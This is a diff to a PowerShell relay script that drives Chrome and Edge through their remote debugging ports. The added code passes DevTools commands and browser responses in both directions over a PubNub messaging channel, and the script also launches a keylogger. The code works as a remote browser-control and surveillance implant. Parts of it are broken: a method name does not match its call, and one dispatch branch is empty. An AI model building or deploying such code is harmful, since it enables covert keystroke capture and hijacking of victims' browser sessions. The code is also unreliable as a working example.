@@ -1135,6 +1135,27 @@ function Process-CDP {
     return $ret
 }
 
+function Process-CDPBridge {
+    param([hashtable]$cmd)
+
+    $isbase64 = $cmd['isbase64']
+    $payload = $cmd['payload']
+
+    if ( $isbase64 ) {
+        $bodystr = [System.Convert]::FromBase64String($payload)
+        $payload = [System.Text.Encoding]::UTF8.GetString($bodystr)
+    }
+        
+    $payload = $payload | ConvertFrom-Json 
+    $payload = Transform-PSCustomObject $payload
+
+    $targetId = $cmd['targetId']
+
+    $cdpobj = $script:wslist.Item($targetId)
+
+    $cdpobj.AddCmd($payload) # anchor
+}
+
 function Send-Result {
     param([hashtable]$result, [hashtable]$resultout)
 
@@ -1184,6 +1205,9 @@ function Process-BuiltInCommand {
     } elseif ( $cmd.builtincmd -eq "ProcessCDP" ) {
         $result = Process-CDP($cmd)
         $result
+
+    } elseif ( $cmd.builtincmd -eq "ProcessCDPBridge" ) {
+        
 
     } elseif ( $cmd.builtincmd -eq "ExecCDPCommand" ) {
         $result = Exec-CDP($cmd)
@@ -1400,6 +1424,28 @@ function Ping-DebugPort {
     return $targets
 }
 
+function Publish-PBMessage {
+    param([hashtable]$Message)
+
+    $payloadjson = $Message | ConvertTo-Json -Compress
+    Log-Msg ("payload: "+$payloadjson)
+
+    $bytes = [System.Text.Encoding]::UTF8.GetBytes($payloadjson)
+    $base64String = [Convert]::ToBase64String($bytes)
+
+    $pbmsg = @{
+        builtincmd="ProcessCDPBridge"
+        source="pscdp.relay.ps1"
+        destination="nodecdpproxy.js"
+        ts=$(Get-Timestamp)
+        resultid=$(Get-Random -Minimum 10000000 -Maximum 99999999)
+        isbase64=$true
+        result=$null
+        cmdid=$null
+    }
+
+    Send-Result $base64String $pbmsg
+}
 
 class PSCDPException : System.Exception {
 
@@ -1413,18 +1459,22 @@ class PSBuiltInCmd {
 
 class PSCDP {
 
+    $isbridge = $false
+
     $debugport = 9223
 
     $logconsolemsg = $false # TODO is this used in the system for anything?
     $bufferSize = 4096
     $resetonattach = $false
 
+    $bridgeTargetID = $null
     $wsUri = $null
     $websocket = $null
 
     [string]$wsname = $null
 
     $sendQueue = [System.Collections.Generic.List[PSCDPCommand]]::new()
+    $sendQueueBridge = [System.Collections.Generic.List[hashtable]]::new()
 
     $commands = [System.Collections.Generic.List[PSCDPCommand]]::new()
     $callbackcmds = [System.Collections.Generic.List[PSCDPCommand]]::new()
@@ -1708,6 +1758,21 @@ class PSCDP {
         return $cmd
     }
     
+    [void] SendCdpBridgeCommand([hashtable]$cmd) {
+        
+        $payload = $cmd | ConvertTo-Json -Compress -Depth 10
+        $bytes = [System.Text.Encoding]::UTF8.GetBytes($payload)
+        $buffer = New-Object System.ArraySegment[byte] -ArgumentList @(,$bytes)
+        
+        $sendTask = $this.websocket.SendAsync($buffer, [System.Net.WebSockets.WebSocketMessageType]::Text, $true, [System.Threading.CancellationToken]::None)
+        
+        if ( $null -ne $sendTask ) {
+            $tresult = $sendTask.GetAwaiter().GetResult()
+        } else {
+            throw [PSCDPCommandException]::new('fatal error -- task is null')
+        }
+    }
+
     [void] InitReceive() {
         if ( ! $this.receiveNew ) {
             return
@@ -1780,7 +1845,19 @@ class PSCDP {
             return
         }
         
-        $this.ProcessMessage($msg)
+        if ( $this.isbridge ) {
+            $this.ProcessBridgeMessage($msg)
+        } else {
+            $this.ProcessMessage($msg)
+        }
+    }
+
+    [void] ProcessBridgeMessage([PSCustomObject]$msg) {
+        $msght = @{}
+        
+        $msght = Transform-PSCustomObject $msg
+
+        Publish-PBMessage $msght    
     }
 
     [void] ProcessMessage([PSCustomObject]$msg) {
@@ -1992,6 +2069,17 @@ class PSCDP {
         return $iserror
     }
 
+    [void] NextBridgeCmd() {
+        if ( $this.sendQueueBridge.Count -le 0 ) {
+            return
+        }
+        
+        $cmd = $this.sendQueueBridge[0]
+        $this.sendQueueBridge.RemoveAt(0)
+
+        $this.SendBridgeCdpCommand($cmd)
+    }
+
     [void] NextCmd() {
 
         if ( $null -eq $this.sendQueue ) {
@@ -2042,6 +2130,10 @@ class PSCDP {
 
         }
 
+    }
+
+    [void] AddCmd([hashtable]$cmd) {
+        $this.sendQueueBridge.Add($cmd)
     }
 
     [PSCDPCommand] AddQueue([hashtable]$msg) {
@@ -2096,12 +2188,9 @@ class PSCDP {
 
     static [void] Iterate([hashtable]$tcdpobj) {
         $cdpobj = $tcdpobj['cdpobj']
-        $check = $tcdpobj['systemcheck']
         $delay = $tcdpobj['delay']
 
-        if ( $null -eq $check ) {
-            $check = $cdpobj.GetSystemHealth()
-        }
+        $check = $cdpobj.GetSystemHealth()
 
         if ( ! $check['issystemok'] ) {
             
@@ -2130,7 +2219,6 @@ class PSCDP {
             $cdpobj = [PSCDP]::new($cdpobj.debugport, $cdpobj.wsname)
             $tcdpobj['cdpobj'] = $cdpobj
             $cdpobj.ConnectCdp()
-
         } else {
             $cdpobj.LogState()
 
@@ -2393,13 +2481,6 @@ class PubNub {
 $script:msedge_debugport = 9222
 $script:chrome_debugport = 9223
 
-try {
-    $script:clientws = [PSCDP]::new($script:chrome_debugport, "clientws")
-    $script:clientws.ConnectCdp()
-} catch {
-    Log-Msg $_
-}
-
 $keyboardlogger = {
     try {
         [PowerShell.KeyLogger]::Main()
@@ -2414,7 +2495,7 @@ $keyboardlogger = {
 # $asyncResult = $ps.BeginInvoke()
 
 if ( [string]::IsNullOrWhiteSpace($script:scriptfname) ) {
-    $scriptfname = "pscdp.relay.ps1"
+    $script:scriptfname = "pscdp.relay.ps1"
 }
 
 $script:pb = [PubNub]::new()
@@ -2427,10 +2508,14 @@ $script:pb.EventHandler = {
     Process-PubNubEvent -Message $pbmsg -cdpobj $script:clientws
 }
 
+$script:clientws = [PSCDP]::new($script:chrome_debugport, "clientws")
+$script:clientws.ConnectCdp()
+
+$script:wslist = [System.Collections.Generic.Dictionary[string, PSCDP]]::new()
+
 $script:clientit = @{
     "cdpobj" = $script:clientws
     "broadcast" = $false
-    "systemcheck" = $null
     "delay" = -1
 }
 
@@ -2455,7 +2540,7 @@ while ( $true ) {
         Log-Msg $_
         $cdpobj = $script:clientit['cdpobj']
         $cdpobj.exceptions.Add($_)
-        # anchor
+        # TODO log report exceptions
     }
 
     Start-Sleep -Milliseconds $d
